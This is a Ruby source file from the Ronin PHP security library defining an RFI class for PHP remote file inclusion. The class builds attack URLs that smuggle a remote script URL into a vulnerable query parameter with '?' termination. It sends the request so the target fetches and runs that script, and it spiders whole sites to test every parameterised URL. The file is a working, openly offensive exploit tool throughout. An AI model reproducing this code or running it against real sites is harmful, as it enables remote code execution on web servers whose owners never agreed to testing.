#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2009 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/extensions/uri'
require 'ronin/network/http'
require 'ronin/web/spider'

require 'digest/md5'

module Ronin
  module PHP
    class RFI

      # Default URL of the RFI Test script
      TEST_SCRIPT = 'http://ronin.rubyforge.org/static/ronin/php/rfi/test.php'

      # Prefix text that will appear before the random RFI challenge string
      CHALLENGE_PREFIX = 'PHP RFI Response: '

      # RFI vulnerable url
      attr_reader :url

      # RFI vulnerable query parameter 
      attr_reader :param

      # Whether to terminate the RFI script url with a null byte
      attr_accessor :terminate

      # URL of the RFI Test script
      attr_accessor :test_script

      #
      # Creates a new RFI object.
      #
      # @param [String, URI::HTTP] url
      #   The URL to attempt to exploit.
      #
      # @param [String, Symbol] param
      #   The query parameter to attempt RFI on.
      #
      # @param [Hash] options
      #   Additional options.
      #
      # @option options [Boolean] :terminate (true)
      #   Specifies whether to terminate the RFI script URL
      #   with a +?+.
      #
      # @option options [String, URI::HTTP] :test_script (RFI.test_script)
      #   The URL of the RFI test script.
      #
      def initialize(url,param,options={})
        @url = url
        @param = param

        if options.has_key?(:terminate)
          @terminate = options[:terminate]
        else
          @terminate = true
        end

        @test_script = (options[:test_script] || RFI.test_script)
      end

      #
      # Specifies the URL to the RFI testing script.
      #
      # @return [String] The URL to the RFI testing script.
      #
      def RFI.test_script
        @@ronin_rfi_test_script ||= TEST_SCRIPT
      end

      #
      # Uses a new URL for the RFI testing script.
      #
      # @param [String] new_url The new URL to the RFI testing script.
      # @return [String] The new URL to the RFI testing script.
      #
      def RFI.test_script=(new_url)
        @@ronin_rfi_test_script = new_url
      end

      def RFI.spider(url,options={},&block)
        rfis = []

        Web::Spider.site(url,options) do |spider|
          spider.every_url_like(/\?[a-zA-Z0-9_]/) do |vuln_url|
            found = vuln_url.test_rfi

            found.each(&block) if block
            rfis += found
          end
        end

        return rfis
      end

      #
      # @return [Boolean]
      #   Specifies whether the RFI script URL will be terminated with
      #   a +?+.
      #
      def terminate?
        @terminate == true
      end

      #
      # Builds a RFI URL.
      #
      # @param [String, URI::HTTP] script_url
      #   The URL of the PHP script to include remotely.
      #
      # @return [URI::HTTP]
      #   The URL to use to trigger the RFI.
      #
      def url_for(script_url)
        script_url = URI(script_url.to_s)
        new_url = URI(@url.to_s)

        new_url.query_params.merge!(script_url.query_params)
        script_url.query_params.clear

        script_url = "#{script_url}?" if terminate?

        new_url.query_params[@param.to_s] = script_url
        return new_url
      end

      #
      # Performs a Remote File Inclusion.
      #
      # @param [String, URI::HTTP] script
      #   The URL of the PHP script to include remotely.
      #
      # @param [Hash] options
      #   Additional HTTP options.
      #
      # @option options [Symbol] :method (:get)
      #   Specifies whether to perform a HTTP POST or GET request.
      #
      # @return [String]
      #   The body of the response from the RFI.
      #
      # @see Net.http_post_body
      # @see Net.http_get_body
      #
      def include(script,options={})
        options = options.merge(:url => url_for(script))

        if options[:method] == :post
          return Net.http_post_body(options)
        else
          return Net.http_get_body(options)
        end
      end

      #
      # Tests whether the URL and query parameter are vulnerable to RFI.
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to RFI.
      #
      def vulnerable?(options={})
        challenge = Digest::MD5.hexdigest((rand(1000) + 1000).to_s)

        test_url = URI(@test_script.to_s)
        test_url.query_params['rfi_challenge'] = challenge

        response = include(test_url,options)
        return response.include?("#{CHALLENGE_PREFIX}#{challenge}")
      end

    end
  end
end
